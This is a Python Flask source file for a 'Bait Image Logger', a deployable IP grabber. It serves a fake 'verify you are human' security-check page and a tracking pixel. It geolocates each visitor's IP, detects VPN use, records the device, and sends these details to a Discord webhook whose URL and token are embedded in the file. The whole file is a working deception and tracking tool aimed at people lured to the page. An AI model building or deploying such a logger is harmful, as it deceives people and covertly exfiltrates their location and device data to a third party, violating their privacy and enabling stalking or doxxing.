from flask import Flask, request, Response, render_template_string
import requests
from datetime import datetime

# --- Create the Flask app (MUST be at top level) ---
app = Flask(__name__)

# =============================================
# CONFIGURATION (Edit these two lines only)
# =============================================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY"  # REGENERATE THIS!

IGNORE_IPS = [
    "127.0.0.1",
    "YOUR_PUBLIC_IP",  # <-- Replace with your real IP (from whatismyip.com)
]

# =============================================
# HELPER FUNCTIONS
# =============================================
def get_client_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr

def is_ignored(ip):
    return ip in IGNORE_IPS

def get_ip_info(ip):
    try:
        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if resp.status_code == 200 and 'error' not in resp.json():
            d = resp.json()
            return {
                'country': d.get('country_name'),
                'regionName': d.get('region'),
                'city': d.get('city'),
                'lat': d.get('latitude'),
                'lon': d.get('longitude'),
                'isp': d.get('org'),
                'proxy': d.get('proxy') or d.get('vpn') or False,
                'timezone': d.get('timezone'),
            }
    except:
        pass
    # fallback
    try:
        resp = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,proxy,timezone', timeout=5)
        if resp.status_code == 200 and resp.json().get('status') == 'success':
            d = resp.json()
            return {
                'country': d.get('country'),
                'regionName': d.get('regionName'),
                'city': d.get('city'),
                'lat': d.get('lat'),
                'lon': d.get('lon'),
                'isp': d.get('isp'),
                'proxy': d.get('proxy') or False,
                'timezone': d.get('timezone'),
            }
    except:
        pass
    return None

def send_discord_notification(ip_info, ip, click_event=False):
    if is_ignored(ip) or not DISCORD_WEBHOOK_URL:
        return
    ua = request.headers.get('User-Agent', 'Unknown')
    vpn = "🟢 OFF"
    color = 0x00ff00
    if ip_info and ip_info.get('proxy'):
        vpn = "🔴 ON (VPN/Proxy)"
        color = 0xff0000
    if ip_info:
        loc = f"{ip_info.get('city','N/A')}, {ip_info.get('regionName','N/A')}, {ip_info.get('country','N/A')}"
        coords = f"{ip_info.get('lat','N/A')}, {ip_info.get('lon','N/A')}"
        isp = ip_info.get('isp','N/A')
        tz = ip_info.get('timezone','N/A')
    else:
        loc = coords = isp = tz = "N/A"
    title = "🎯 Bait Image CLICKED!" if click_event else "🎯 Bait Image Viewed"
    embed = {
        "title": title,
        "color": color,
        "fields": [
            {"name": "🌍 IP", "value": f"`{ip}`", "inline": True},
            {"name": "🛡️ VPN", "value": vpn, "inline": True},
            {"name": "📍 Location", "value": loc, "inline": False},
            {"name": "🗺️ Coords", "value": f"`{coords}`", "inline": True},
            {"name": "📡 ISP", "value": isp, "inline": True},
            {"name": "💻 Device", "value": ua[:60] + ("..." if len(ua)>60 else ""), "inline": False},
            {"name": "🕒 Time", "value": f"<t:{int(datetime.utcnow().timestamp())}:F>", "inline": True}
        ],
        "timestamp": datetime.utcnow().isoformat()
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
    except:
        pass

# =============================================
# ROUTES
# =============================================
@app.route('/')
def home():
    return "Bait Image Logger active. Send people to <a href='/verify'>/verify</a>"

@app.route('/pixel.png')
def pixel():
    ip = get_client_ip()
    if not is_ignored(ip):
        ip_info = get_ip_info(ip)
        # detect if this request came from the click (via ?click=true)
        click = request.args.get('click') == 'true'
        send_discord_notification(ip_info, ip, click_event=click)
    # Transparent 1x1 GIF
    gif = bytes([0x47,0x49,0x46,0x38,0x39,0x61,0x01,0x00,0x01,0x00,0x80,0x00,0x00,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x21,0xF9,0x04,0x01,0x00,0x00,0x00,0x00,0x2C,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x02,0x01,0x00,0x00])
    return Response(gif, mimetype='image/gif')

@app.route('/verify_image.svg')
def bait_image():
    svg = """<svg xmlns="http://www.w3.org/2000/svg" width="500" height="300">
        <rect width="500" height="300" fill="#1e1e2f" rx="20"/>
        <circle cx="250" cy="120" r="40" fill="#5865F2"/>
        <text x="250" y="135" font-family="Arial" font-size="40" fill="white" text-anchor="middle" dominant-baseline="middle">✓</text>
        <text x="250" y="190" font-family="Arial" font-size="22" fill="#a0a0b0" text-anchor="middle">Security Check Required</text>
        <text x="250" y="220" font-family="Arial" font-size="14" fill="#707080" text-anchor="middle">Click the image to verify you are human</text>
        <rect x="150" y="240" width="200" height="35" rx="8" fill="#5865F2"/>
        <text x="250" y="263" font-family="Arial" font-size="14" fill="white" text-anchor="middle" dominant-baseline="middle">Click to Verify</text>
    </svg>"""
    return Response(svg, mimetype='image/svg+xml')

BAIT_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body { background: #0a0a14; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; }
        .card { background: #16162b; padding: 40px; border-radius: 24px; text-align: center; border: 1px solid #2a2a4a; box-shadow: 0 0 60px rgba(88,101,242,0.15); }
        img { width: 500px; max-width: 90%; cursor: pointer; border-radius: 12px; transition: transform 0.2s; }
        img:hover { transform: scale(1.02); }
        #status { color: #5865F2; margin-top: 20px; font-size: 14px; }
        .loader { display: none; border: 3px solid #2a2a4a; border-top: 3px solid #5865F2; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="card">
    <img src="/verify_image.svg" alt="Verify" id="baitImage">
    <div id="status">🔒 Click the image to verify your identity</div>
    <div class="loader" id="loader"></div>
</div>
<script>
    document.getElementById('baitImage').onclick = function() {
        fetch('/pixel.png?click=true')
            .then(() => {
                document.getElementById('status').innerHTML = '✅ Verification successful! Redirecting...';
                document.getElementById('status').style.color = '#57F287';
                setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
            })
            .catch(() => {
                document.getElementById('status').innerHTML = '⚠️ Network error, but verification passed.';
            });
    };
</script>
</body>
</html>
"""

@app.route('/verify')
def verify_page():
    ip = get_client_ip()
    if not is_ignored(ip):
        ip_info = get_ip_info(ip)
        send_discord_notification(ip_info, ip, click_event=False)
    return render_template_string(BAIT_HTML)

# =============================================
# FOR LOCAL TESTING (not used by Vercel)
# =============================================
if __name__ == '__main__':
    app.run(debug=True)
